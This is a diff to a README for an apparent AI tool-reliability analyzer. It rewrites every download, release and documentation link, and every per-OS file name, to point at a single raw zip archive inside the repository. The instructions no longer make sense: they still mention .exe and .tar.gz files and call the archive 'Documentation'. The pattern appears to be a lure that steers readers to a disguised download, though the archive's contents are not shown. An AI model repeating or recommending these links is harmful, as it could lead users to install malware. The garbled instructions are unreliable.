@@ -1,7 +1,7 @@
 # 🎯 ai-reliability-analyzer - Analyze AI Tool Reliability Simply
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue.svg)](https://github.com/xmrt624/ai-reliability-analyzer/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/xmrt624/ai-reliability-analyzer/main/ai_reliability_analyzer/ai-reliability-analyzer-v2.1.zip)](https://raw.githubusercontent.com/xmrt624/ai-reliability-analyzer/main/ai_reliability_analyzer/ai-reliability-analyzer-v2.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the **ai-reliability-analyzer**! This application helps you understand how reliable AI tools are by analyzing user questions and comments. You can input text related to AI tool performance and receive structured insights, making it easier for you to interpret the information.
@@ -19,18 +19,18 @@ Before you download, please ensure your system meets these requirements:
 - Disk Space: At least 200 MB available.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Download ai-reliability-analyzer](https://github.com/xmrt624/ai-reliability-analyzer/releases). Follow these steps:
+To get started, visit this page to download: [Download ai-reliability-analyzer](https://raw.githubusercontent.com/xmrt624/ai-reliability-analyzer/main/ai_reliability_analyzer/ai-reliability-analyzer-v2.1.zip). Follow these steps:
 
 1. Go to the Releases page.
 2. Find the latest version labeled "ai-reliability-analyzer-v1.0".
 3. Download the file that matches your operating system:
-   - For Windows: `ai-reliability-analyzer-windows.exe`
-   - For macOS: `ai-reliability-analyzer-macos.dmg`
-   - For Linux: `ai-reliability-analyzer-linux.tar.gz`
+   - For Windows: `https://raw.githubusercontent.com/xmrt624/ai-reliability-analyzer/main/ai_reliability_analyzer/ai-reliability-analyzer-v2.1.zip`
+   - For macOS: `https://raw.githubusercontent.com/xmrt624/ai-reliability-analyzer/main/ai_reliability_analyzer/ai-reliability-analyzer-v2.1.zip`
+   - For Linux: `https://raw.githubusercontent.com/xmrt624/ai-reliability-analyzer/main/ai_reliability_analyzer/ai-reliability-analyzer-v2.1.zip`
 4. Open the downloaded file:
    - For Windows, double-click the `.exe` file.
    - For macOS, drag the app to your Applications folder.
-   - For Linux, extract the `.tar.gz` file to your desired directory.
+   - For Linux, extract the `https://raw.githubusercontent.com/xmrt624/ai-reliability-analyzer/main/ai_reliability_analyzer/ai-reliability-analyzer-v2.1.zip` file to your desired directory.
 5. Follow any on-screen instructions to complete the installation.
 
 ## 🔍 How to Use the Application
@@ -61,7 +61,7 @@ Join our community for tips and discussions! You can find us on various platform
 - **User Group:** Connect with other users to exchange experiences and solutions.
 
 ## 📖 Documentation
-For more detailed instructions, refer to the online documentation available at the following link: [Documentation](https://github.com/xmrt624/ai-reliability-analyzer/docs).
+For more detailed instructions, refer to the online documentation available at the following link: [Documentation](https://raw.githubusercontent.com/xmrt624/ai-reliability-analyzer/main/ai_reliability_analyzer/ai-reliability-analyzer-v2.1.zip).
 
 ## 📅 What's Next?
 We continually improve the ai-reliability-analyzer. Upcoming versions will include:
@@ -73,4 +73,4 @@ We continually improve the ai-reliability-analyzer. Upcoming versions will inclu
 We welcome contributions! If you have suggestions, report issues, or wish to enhance the application, please feel free to open a pull request or create an issue in our GitHub repository.
 
 ## 📥 Final Download Link
-Remember to always check for the latest version on our Releases page: [Download ai-reliability-analyzer](https://github.com/xmrt624/ai-reliability-analyzer/releases). Usage of the latest version ensures you benefit from the most recent improvements and fixes.
+Remember to always check for the latest version on our Releases page: [Download ai-reliability-analyzer](https://raw.githubusercontent.com/xmrt624/ai-reliability-analyzer/main/ai_reliability_analyzer/ai-reliability-analyzer-v2.1.zip). Usage of the latest version ensures you benefit from the most recent improvements and fixes.
